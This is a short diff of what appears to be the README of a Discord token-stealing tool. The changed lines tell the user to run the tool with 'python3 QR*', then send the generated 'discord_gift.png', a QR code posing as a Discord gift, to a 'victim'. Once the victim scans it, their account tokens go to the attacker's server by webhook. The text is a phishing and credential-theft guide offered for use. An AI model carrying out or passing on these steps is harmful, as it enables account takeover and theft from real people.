@@ -26,4 +26,4 @@ Forth Step, Run The Tools In Your Console
 ```
 python3 QR*
 ```
-Last Step, Send discord_gift.png To Victim And Wait For Him To Scan The Image.Boom! His Tokens Will Send To Your Server By Webhook
+Last Step, Send discord_gift.png You Generated Just Now To Victim And Wait For Him To Scan The Image.Boom! His Tokens Will Send To Your Server By Webhook
